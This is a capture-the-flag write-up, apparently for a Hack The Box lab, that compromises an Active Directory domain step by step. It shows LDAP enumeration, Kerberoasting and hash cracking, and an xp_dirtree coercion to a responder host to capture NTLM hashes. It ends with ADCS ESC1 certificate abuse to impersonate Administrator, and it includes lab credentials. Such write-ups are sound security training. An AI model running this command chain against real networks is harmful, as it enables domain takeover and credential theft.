___
## Network recon
```bash
sudo nmap -T4 -A -v -o nmap --min-rate 1000 10.129.229.25 -Pn
```

Multi-protocol recon
```bash
enum4linux-ng -A 10.129.229.25
```
![](../../assets/Pasted%20image%2020250619205012.png)

We have anonymous LDAP access
## LDAP Enumeration
Get users:
```bash
ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectclass=user))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " " > users.txt
```
Validate users:
```bash
kerbrute userenum -d certified.htb --dc 10.129.229.25 users.txt
```
![](../../assets/Pasted%20image%2020250619151753.png)
All users but guest are valid + all users require preauth for tickets requests. 
Getting users descriptions
```bash
nxc ldap 10.129.229.25 -u '' -p '' -M get-desc-users
```
We get a password
![](../../assets/Pasted%20image%2020250619151934.png)
## Lateral Movement to MSSQLSERVER
Lets check for users with SPNs set
```bash
ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectClass=user)(servicePrincipalName=*))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " "
```
![](../../assets/Pasted%20image%2020250619152420.png)
user is kerberoastable! 
```bash
impacket-GetUserSPNs -dc-ip 10.129.229.25 certified.htb/ldapusr:'ldapisfun' -request-user MSSQLSERVER
```
![](../../assets/Pasted%20image%2020250619153206.png)
Try to crack the hash
```bash
hashcat -m 13100 mssqlserver.hash /usr/share/wordlists/rockyou.txt
```
![](../../assets/Pasted%20image%2020250619153349.png)
```
MSSQLSERVER:lucky7
```
## MSSQL Enumeration
```
nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -q 'SELECT name FROM master.dbo.sysdatabases;'
```
![](../../assets/Pasted%20image%2020250619154454.png)
```bash
impacket-mssqlclient MSSQLSERVER:'lucky7'@10.129.229.25 -windows-auth
```

We enumerate stored procedures and tables, we find out we can't run `xp_cmdshell` to get RCE. We can run `xp_dirtree` for force auth.
Start responder:
```bash
sudo responder -I tun0
```
Trigger auth:
```sql
xp_dirtree \\10.10.14.4\test
```
![](../../assets/Pasted%20image%2020250619160138.png)
Lets try to crack the NTLMv2 hash
```bash
hashcat -m 5600 thomas.hash /usr/share/wordlists/rockyou.txt
```
![](../../assets/Pasted%20image%2020250619160436.png)
```
thomas:159357
```
we have access with winrm
```bash
nxc winrm 10.129.229.25 -u thomas -p '159357'
```
![](../../assets/Pasted%20image%2020250619160709.png)
```bash
evil-winrm -i 10.129.229.25 -u thomas -p '159357'
```
after grabbing the user flag and poking around, i decided to run bloodhound
```bash
sudo bloodhound-ce-python -u 'thomas' -p '159357' -ns 10.129.229.25 -d certified.htb -c all
```
![](../../assets/Pasted%20image%2020250619165504.png)
We see `thomas` has inherited access to the `CERTIFICATE SERVICE DCOM ACCESS` group. This makes me think the priv esc is an ADCS misconfiguration
![](../../assets/Pasted%20image%2020250619165619.png)
## Administrator
---
Use certipy to find vulnerable templates
```bash
certipy-ad find -vulnerable -u thomas -p '159357' -dc-ip 10.129.229.25
```
![](../../assets/Pasted%20image%2020250619171052.png)
We see this template is vulnerable to ESC1
![](../../assets/Pasted%20image%2020250619171221.png)
Lets collect what we need for ESC1: Template name, CA, target domain.
![](../../assets/Pasted%20image%2020250619171545.png)

we can build our pfx request targeting the administrator user
```bash
certipy-ad req -u thomas -p '159357' -dc-ip 10.129.229.25 -template Auth -upn Administrator@certified.htb -ca CERTIFIED-CA -target certified.certified.htb
```
![](../../assets/Pasted%20image%2020250619171857.png)
We can either use the pfx directly with nxc:
```bash
nxc smb 10.129.229.25 --pfx-cert administrator.pfx -u 'Administrator'
```
![](../../assets/Pasted%20image%2020250619173218.png)
OR use `certipy auth` to get a TGS and NTLM hash
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.25
```
![](../../assets/Pasted%20image%2020250619173236.png)
and use that to auth.